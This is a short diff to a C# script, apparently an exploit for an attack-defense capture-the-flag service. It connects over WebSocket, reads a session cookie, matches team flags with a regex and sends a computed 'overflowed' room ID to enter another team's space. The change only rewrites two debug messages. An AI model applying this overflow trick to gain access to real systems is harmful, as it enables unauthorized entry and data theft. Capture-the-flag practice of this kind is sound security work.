@@ -53,7 +53,7 @@ var ws1 = new ClientWebSocket();
 await ws1.ConnectAsync(new Uri($"ws://{hostAndPort}/ws"), hc, CancellationToken.None);
 
 var cookie = cookies.GetAllCookies().FirstOrDefault(c => c.Name == "usr")?.Value;
-await Console.Error.WriteLineAsync("Cookie: " + cookie);
+await Console.Error.WriteLineAsync("cookie: " + cookie);
 
 var flagRegex = new Regex(@"^TEAM\d{1,3}_[A-Z0-9]{32}$", RegexOptions.Compiled | RegexOptions.CultureInvariant);
 
@@ -97,7 +97,7 @@ await Task.Delay(1000);
 var context = args[1];
 var spaceIdToPwn = context.Split('/')[0];
 var pwn = FindOverflowedEqualValue(spaceIdToPwn);
-await Console.Error.WriteLineAsync("" + pwn);
+await Console.Error.WriteLineAsync($"original '{spaceIdToPwn}' => overflow '{pwn}'");
 
 await ws1.SendAsync(JsonSerializer.SerializeToUtf8Bytes(new Command(MsgType.Room, pwn), jsonOptions), WebSocketMessageType.Text, true, CancellationToken.None);
 await Task.Delay(1000);
